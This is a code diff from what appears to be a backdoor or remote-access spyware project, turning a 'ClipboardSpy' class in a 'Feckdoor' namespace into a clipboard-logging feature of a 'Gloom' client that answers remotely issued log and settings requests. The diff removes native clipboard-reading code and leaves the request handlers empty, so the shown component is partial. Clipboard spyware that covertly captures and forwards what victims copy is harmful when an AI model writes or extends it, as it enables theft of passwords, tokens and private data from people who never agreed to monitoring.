@@ -1,20 +1,26 @@
-﻿using Serilog;
+﻿using Gloom.Client.Features.Logger.InputLog;
 using System.Text;
 
-namespace Feckdoor.InputLog
+namespace Gloom.Client.Features.Logger
 {
-	public class ClipboardSpy : IDisposable
+	public class ClipboardLogger : FeatureBase, IDisposable
 	{
 		protected readonly CancellationTokenSource cancel;
 
 		private int PrevSequenceNum = 0;
 		private bool disposed;
 
-		public ClipboardSpy()
+		public ClipboardLogger(IMessageSender sender) : base(sender)
 		{
-			cancel = new CancellationTokenSource();
-			Task.Run(async () => await ClipboardSpyProc(cancel.Token));
 		}
+
+		public override Guid[] AcceptedOps => new Guid[] { OpCodes.ClipboardLogRequest, OpCodes.ClipboardLoggerSettingRequest };
+
+		//public ClipboardLogger()
+		//{
+		//	cancel = new CancellationTokenSource();
+		//	Task.Run(async () => await ClipboardSpyProc(cancel.Token));
+		//}
 
 		private async Task ClipboardSpyProc(CancellationToken ct)
 		{
@@ -23,7 +29,7 @@ namespace Feckdoor.InputLog
 				int newSeqNum = User32.GetClipboardSequenceNumber();
 				if (PrevSequenceNum != newSeqNum)
 				{
-					string? Data = GetClipboardDataNative();
+					var Data = GetClipboardDataNative();
 					if (Data != null)
 					{
 						if (Data.Length > 100)
@@ -36,63 +42,16 @@ namespace Feckdoor.InputLog
 			}
 		}
 
-		private static unsafe string? GetClipboardDataNative()
+		public override Task HandleAsync(Guid op, byte[] data)
 		{
-			try
+			if (op == OpCodes.ClipboardLogRequest)
 			{
-				User32.OpenClipboard(IntPtr.Zero);
-				uint filter = User32.CF_UNICODETEXT;
 
-				if (User32.GetPriorityClipboardFormat(&filter, 1) == User32.CF_UNICODETEXT)
-				{
-					IntPtr clipHandle = User32.GetClipboardData(User32.CF_UNICODETEXT);
-					string? clipString = null;
-					if (clipHandle != IntPtr.Zero)
-					{
-						try
-						{
-							clipString = new string((char*)Kernel32.GlobalLock(clipHandle));
-						}
-						finally
-						{
-							Kernel32.GlobalUnlock(clipHandle);
-						}
-					}
-					return clipString;
-				}
 			}
-			catch (Exception e)
+			else if (op == OpCodes.ClipboardLoggerSettingRequest)
 			{
-				Log.Warning(e, "Exception during native clipboard access.");
-			}
-			finally
-			{
-				try
-				{
-					User32.CloseClipboard();
-				}
-				catch (Exception e)
-				{
-					Log.Error(e, "Exception during closing the clipboard.");
-				}
-			}
 
-			return null;
-		}
-
-		protected virtual void Dispose(bool disposing)
-		{
-			if (!disposed)
-			{
-				cancel.Cancel();
-				disposed = true;
 			}
-		}
-
-		public void Dispose()
-		{
-			Dispose(disposing: true);
-			GC.SuppressFinalize(this);
 		}
 	}
 
